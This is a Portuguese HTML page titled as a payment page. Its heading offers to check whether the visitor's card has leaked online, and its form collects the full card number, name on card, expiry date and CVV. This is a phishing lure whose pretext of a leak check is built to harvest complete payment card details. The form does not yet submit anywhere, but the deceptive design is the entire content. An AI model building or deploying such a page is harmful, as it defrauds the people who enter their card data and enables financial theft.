<!DOCTYPE html>
<html lang="pt-br">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Página de Pagamento</title>
  <link rel="stylesheet" href="style.css">
</head>
<body>
  <div class="container">
    <h2>Verificar se seu cartão vazou na net</h2>
    <form action="#" method="POST" class="payment-form">
      <div class="form-group">
        <label for="cardNumber">Número do Cartão</label>
        <input type="text" id="cardNumber" name="cardNumber" required placeholder="Digite o número do cartão" maxlength="16">
      </div>
      <div class="form-group">
        <label for="cardName">Nome no Cartão</label>
        <input type="text" id="cardName" name="cardName" required placeholder="Nome como aparece no cartão">
      </div>
      <div class="form-group">
        <label for="expiryDate">Data de Expiração</label>
        <input type="month" id="expiryDate" name="expiryDate" required>
      </div>
      <div class="form-group">
        <label for="cvv">Código de Segurança (CVV)</label>
        <input type="text" id="cvv" name="cvv" required maxlength="3" placeholder="CVV">
      </div>
      <button type="submit" class="submit-button">Verificar</button>
    </form>
  </div>
</body>
</html>
